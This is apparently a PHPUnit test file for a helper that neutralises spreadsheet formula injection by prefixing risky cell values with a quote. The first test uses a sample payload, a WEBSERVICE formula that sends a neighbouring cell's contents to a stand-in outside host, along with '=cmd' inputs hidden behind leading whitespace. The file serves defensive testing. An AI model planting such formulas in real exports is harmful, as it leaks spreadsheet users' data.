<?php

declare(strict_types=1);

namespace Tests\Unit\Support;

use App\Support\SpreadsheetCell;
use PHPUnit\Framework\Attributes\Test;
use Tests\Base\FeatureTestCase;

final class SpreadsheetCellTest extends FeatureTestCase
{
    #[Test]
    public function it_prefixes_values_that_spreadsheet_software_would_evaluate(): void
    {
        $this->assertSame("'=WEBSERVICE(\"http://exemplo/\"&B2)", SpreadsheetCell::guard('=WEBSERVICE("http://exemplo/"&B2)'));
        $this->assertSame("'@SUM(A1:A9)", SpreadsheetCell::guard('@SUM(A1:A9)'));
        $this->assertSame("'+1+1", SpreadsheetCell::guard('+1+1'));
        $this->assertSame("'\t=cmd", SpreadsheetCell::guard("\t=cmd"));
    }

    #[Test]
    public function it_neutralises_a_prefix_hidden_by_leading_whitespace(): void
    {
        $this->assertSame("'  =cmd", SpreadsheetCell::guard('  =cmd'));
    }

    #[Test]
    public function it_leaves_ordinary_text_and_null_untouched(): void
    {
        $this->assertSame('Motor bomba 3kW', SpreadsheetCell::guard('Motor bomba 3kW'));
        $this->assertSame('', SpreadsheetCell::guard(null));
        $this->assertSame('', SpreadsheetCell::guard(''));
    }

    #[Test]
    public function it_does_not_rewrite_values_that_cannot_become_formulas(): void
    {
        $this->assertSame('#1284', SpreadsheetCell::guard('#1284'));
        $this->assertSame('1.234,56', SpreadsheetCell::guard('1.234,56'));
        $this->assertSame('23%', SpreadsheetCell::guard('23%'));
        $this->assertSame('04/11/2026 15:30', SpreadsheetCell::guard('04/11/2026 15:30'));
    }
}
